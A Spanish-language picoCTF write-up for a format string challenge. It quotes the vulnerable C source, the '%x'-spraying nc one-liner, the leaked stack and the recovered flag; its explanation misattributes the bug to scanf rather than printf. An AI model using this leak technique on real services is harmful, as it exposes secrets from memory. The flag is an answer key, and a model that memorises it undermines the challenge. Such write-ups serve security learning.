## Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 57573`
## Solución
Revisamos el código.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```
Vemos que el código tiene un scanf, este scanf no formatea la salida, al no formatearla asume que es una cadena. Enviamos %x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x para ver  la memoria en hexadecimal.
```bash
                                                                                 
┌──(kali㉿kali)-[~/picoCTF/binexp1]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 54798
Tell me a story and then I'll tell you one >> Here's a story - 
ffd67530ffd675508049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825ec92dd00ec7b2ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad200090682f000ec969990804c00080494100804c000ffd6761880494182ffd676c4ffd676d00ffd67630

```

La convertimos con cyberchef.
![[Pasted image 20241111105024.png]]

`picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`
## Notas Adicionales

## Referencias
